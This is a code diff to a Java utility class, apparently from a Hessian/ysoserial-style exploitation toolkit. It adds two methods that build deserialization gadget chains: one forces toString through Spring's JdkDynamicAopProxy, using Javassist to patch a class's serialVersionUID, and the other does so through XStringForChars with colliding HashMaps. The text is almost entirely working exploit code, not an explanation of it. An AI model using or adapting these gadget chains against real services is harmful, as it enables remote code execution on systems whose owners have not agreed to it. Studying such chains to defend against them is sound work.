@@ -23,14 +23,18 @@ SOFTWARE.
 package cn.butler.hessian.util;
 
 
+import cn.butler.yso.JavassistClassLoader;
 import cn.butler.yso.payloads.util.Reflections;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
 import com.sun.rowset.JdbcRowSetImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtField;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
-
 import javax.activation.DataHandler;
 import javax.activation.DataSource;
 import javax.crypto.Cipher;
@@ -49,6 +53,8 @@ import java.net.URLClassLoader;
 import java.rmi.RemoteException;
 import java.rmi.server.ObjID;
 import java.util.*;
+import static cn.butler.yso.payloads.util.Reflections.createWithoutConstructor;
+import static cn.butler.yso.payloads.util.Reflections.setFieldValue;
 
 
 /**
@@ -217,6 +223,68 @@ public final class JDKUtil {
         Object regctx = Reflections.createWithoutConstructor(regctxcl);
         Reflections.setFieldValue(regctx, "registry", regi);
         return regctx;
+    }
+
+
+    /**
+     * 通过JdkDynamicAopProxy触发toString调用
+     * @param object
+     * @return
+     * @throws Exception
+     */
+    public static Map makeToStringForJdkDynamicAopProxy ( Object object) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        //修改org.springframework.aop.framework.DefaultAdvisorChainFactory类的suid值
+        pool.insertClassPath(new ClassClassPath(Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory")));
+        final CtClass defaultAdvisorChainFactoryCtClass = pool.get("org.springframework.aop.framework.DefaultAdvisorChainFactory");
+        try {
+            CtField ctSUID = defaultAdvisorChainFactoryCtClass.getDeclaredField("serialVersionUID");
+            defaultAdvisorChainFactoryCtClass.removeField(ctSUID);
+        }catch (javassist.NotFoundException e){}
+        defaultAdvisorChainFactoryCtClass.addField(CtField.make("private static final long serialVersionUID = 273003553246259276L;", defaultAdvisorChainFactoryCtClass));
+
+        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Class<?> advisedSupportClass = Class.forName("org.springframework.aop.framework.AdvisedSupport");
+        Constructor<?> constructor = jdkDynamicAopProxyClass.getConstructor(advisedSupportClass);
+        constructor.setAccessible(true);
+        Object advisedSupport = advisedSupportClass.newInstance();
+
+        //替换旧的DefaultAdvisorChainFactory对象
+        final Object defaultAdvisorChainFactory1 = defaultAdvisorChainFactoryCtClass.toClass(new JavassistClassLoader()).newInstance();
+        defaultAdvisorChainFactoryCtClass.defrost();
+        Reflections.setFieldValue(advisedSupport, "advisorChainFactory", defaultAdvisorChainFactory1);
+
+        Method setTarget = advisedSupport.getClass().getMethod("setTarget", Object.class);
+        setTarget.invoke(advisedSupport, object);
+        InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(advisedSupport);
+
+        //使用JdkDynamicAopProxy触发toString调用
+        Map m = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
+        Constructor<?> c = Class.forName("java.util.Collections$SetFromMap").getDeclaredConstructors()[0];
+        c.setAccessible(true);
+        Object map = c.newInstance(Collections.EMPTY_MAP);
+        setFieldValue(map, "m", m);
+        return map;
+    }
+
+    /**
+     * 通过XStringForChars制作toString触发器
+     * @param object
+     * @return
+     * @throws Exception
+     */
+    public static HashMap<Object, Object> makeToStringForXStringForChars ( Object object) throws Exception{
+        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
+        Object xstring = createWithoutConstructor(aClass1);
+        setFieldValue(xstring,"m_obj",new char[]{});
+        HashMap<Object, Object> map1 = new HashMap();
+        HashMap<Object, Object> map2 = new HashMap();
+        map1.put("yy", object);
+        map1.put("zZ", xstring);
+        map2.put("yy", xstring);
+        map2.put("zZ", object);
+        HashMap hashmap = makeMap(map1, map2);
+        return hashmap;
     }
 
     /**
